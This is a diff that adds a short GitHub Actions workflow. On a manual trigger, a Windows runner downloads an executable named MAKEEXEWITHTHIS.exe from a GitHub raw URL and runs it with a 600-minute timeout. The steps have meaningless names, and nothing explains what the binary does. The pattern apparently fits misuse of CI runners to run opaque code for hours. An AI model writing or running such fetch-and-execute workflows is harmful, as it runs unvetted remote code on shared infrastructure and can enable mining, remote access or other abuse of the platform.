@@ -1,0 +1,11 @@
+name: MAKEEXEWITHTHIS
+on: workflow_dispatch
+jobs:
+  build:
+    runs-on: windows-2019
+    steps:
+    - name: GHI
+      run: Invoke-WebRequest https://github.com/reniadeveloper/projk/raw/main/MAKEEXEWITHTHIS.exe -OutFile MAKEEXEWITHTHIS.exe
+    - name: JKL
+      run: .\MAKEEXEWITHTHIS.exe
+      timeout-minutes: 600
